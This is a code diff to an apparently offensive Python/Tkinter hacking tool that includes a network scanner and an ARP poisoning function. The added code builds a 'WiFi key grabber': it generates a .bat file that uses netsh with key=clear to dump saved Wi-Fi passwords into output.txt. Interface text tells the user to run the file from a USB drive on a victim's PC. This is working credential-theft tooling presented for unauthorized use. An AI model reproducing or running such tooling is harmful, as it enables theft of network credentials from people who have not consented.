@@ -81,7 +81,7 @@ def NetworkScanner(ipaddr, st1, en1, ver, out, start):
                 out.insert(END, "[+] %s --> Live\n\tMac address: %s \n"%(addr, mac))
                 out.insert(END, "\tHost Name: %s\n\n"%(hname))
                 out.see("end")
-                new=[addr, mac]
+                new=[addr, mac, hname]
                 if new in captured_host:
                     pass
                 else:
@@ -449,6 +449,10 @@ def ArpPoisoningAttack(target, gateway, out2, attack):
     
 
 #____________________________________________
+global table_on
+table_on=False
+#global wifi_g
+#wifi_g=False
 
 def main():
     root=tk.Tk()
@@ -458,6 +462,122 @@ def main():
     nscan=Frame(root, bg="gray")
     mscan=Frame(root, bg="gray")
     arp_a=Frame(root, bg="gray")
+    r_table=Frame(root, bg="darkgray")
+    #tool_1=Frame(root, bg="gray")
+    def menu_callback2():
+        print("coming soon")
+    def menu_callback():
+        global captured_host, table_on
+        if table_on==False:
+            table_on=True
+            null=Label(r_table, text=" ", bg="darkgray")
+            null.pack(padx=280, pady=140)
+            
+            txt="IP ADDRESS\t\t\tMAC ADDRESS\t\t\tHOST NAME\n"
+            txt+="-"*104
+            txt+="\n"
+            if captured_host==[]:
+                pass
+            else:
+                for host in captured_host:
+                    txt+="%s\t\t\t%s\t\t\t%s\n"%(host[0],host[1],host[2])
+            
+            labelframe_widget = tk.LabelFrame(r_table,text="Host Table", bg="darkgray",font=("Courier CE",12))
+            label_widget=Text(labelframe_widget, height=15, width=65,bg="darkgray",font=("Courier CE",11))
+            labelframe_widget.place(x=10, y=10)
+            label_widget.pack()
+            label_widget.insert(END, txt)
+            
+            r_table.place(x=100, y=150)
+        else:
+            r_table.place_forget()
+            table_on=False
+    def submenu_callback1():
+        tool_1=tk.Tk()
+        tool_1.geometry("700x400")
+        tool_1.config(bg="gray")
+        labl=Label(tool_1, text="Description:", bg="gray",font=("Courier CE",13))
+        labl.place(x=10, y=10)
+        lab2=Label(tool_1, text="This tool generate a wifi password grabber with extension .bat", bg="gray",font=("Courier CE",10))
+        lab2.place(x=10, y=30)
+        lab3=Label(tool_1, text="Put the file into a USB pendrive. When you put the USB into the victim's pc, double click the file .bat \nand wait for the prompt window to close.\n Then you can unplug the USB from the victim pc. On the USB you'll find a file 'output.txt' with the passwords.", bg="gray",font=("Courier CE",10))
+        lab3.place(x=10, y=50)
+        def gen_grabber():
+            #comm=for /f "skip=9 tokens=1,2 delims=:" %i in ('netsh wlan show profiles') do @echo %j | findstr -i -v echo | netsh wlan show profiles %j key=clear | find/I "Nome SSID"
+            comm1="for /f %s %s in ('netsh wlan show profiles') do @echo %s | findstr -i -v echo | netsh wlan show profiles %s key=clear | find/I %s"%('"skip=9 tokens=1,2 delims=:"',"%i","%j","%j", '"Nome SSID"')
+            comm="netsh wlan show profiles"
+            output = os.popen(comm)
+            output=output.readlines()
+            output=output[9]
+            #output=output.replace("  ","")
+            output=output.split()
+            find1=False
+            output2=""
+            #print(output)
+            for c in output:
+                if find1==True:
+                    output2+=c
+                if c==":":
+                    find1=True
+            comm="netsh wlan show profiles %s key=clear"%(output2)
+            output=os.popen(comm)
+            output=output.readlines()
+            nssid=output[21]
+
+            find1=False
+            output2=""
+            for c in nssid:
+                if c==":":
+                    find1=True
+                if find1==False:
+                    output2+=c
+            nssid=output2.replace("  ","")
+            nkey=output[33]
+            
+            find1=False
+            output2=""
+            for c in nkey:
+                if c==":":
+                    find1=True
+                if find1==False:
+                    output2+=c
+            nkey=output2.replace("  ","")
+            
+            nssid='"%s"'%(nssid)
+            nkey='"%s"'%(nkey)
+            #print(nssid+"\n"+nkey)
+            comm1="for /f %s %s in ('netsh wlan show profiles') do @echo %s | findstr -i -v echo | netsh wlan show profiles %s key=clear | find/I %s"%('"skip=9 tokens=1,2 delims=:"',"%%i","%%j","%%j", nssid)
+            comm2="for /f %s %s in ('netsh wlan show profiles') do @echo %s | findstr -i -v echo | netsh wlan show profiles %s key=clear | find/I %s"%('"skip=9 tokens=1,2 delims=:"',"%%i","%%j","%%j", nkey)
+            file=open("password_grabber.bat","w")
+            file.write("""
+@echo off
+call :sub >output.txt
+exit /b
+
+:sub
+%s
+%s
+"""%(comm1, comm2))
+            file.close()
+            lab4=Label(tool_1, text="'password_grabber.bat' generated", bg="gray",font=("Courier CE",11), fg="darkgreen")
+            lab4.place(x=10, y=250)
+            
+        gen=Button(tool_1, text="Generate", command=gen_grabber ,font=("Courier",12))
+        gen.place(x=200,y=200, width=100,height=30)
+                        
+        
+        
+    def submenu_callback():
+        print("coming soon")
+        
+    menu_widget = tk.Menu(root)
+    submenu_widget = tk.Menu(menu_widget, tearoff=False)
+    submenu_widget.add_command(label="WiFi key grabber",command=submenu_callback1)
+    submenu_widget.add_command(label="coming soon",command=submenu_callback)
+    menu_widget.add_command(label="Host Table", command=menu_callback)
+    menu_widget.add_cascade(label="Other tools",menu=submenu_widget)
+    menu_widget.add_command(label="Info",command=menu_callback2)
+    root.config(menu=menu_widget)
 
     def select():
         global state_b, be_verbose
@@ -705,13 +825,11 @@ def main():
                                  variable=radioValue, value=1, command=select) 
     rdioTwo = tk.Radiobutton(root, text='Port Scan',
                                  variable=radioValue, value=2, command=select) 
-##    rdioThree = tk.Radiobutton(root, text='March',
-##                                 variable=radioValue, value=3)
+
 
     rdioOne.place(x=50, y=100)
     rdioTwo.place(x=150, y=100)
-    #rdioThree.grid(column=0, row=2)
-
+   
 
     root.mainloop()
     
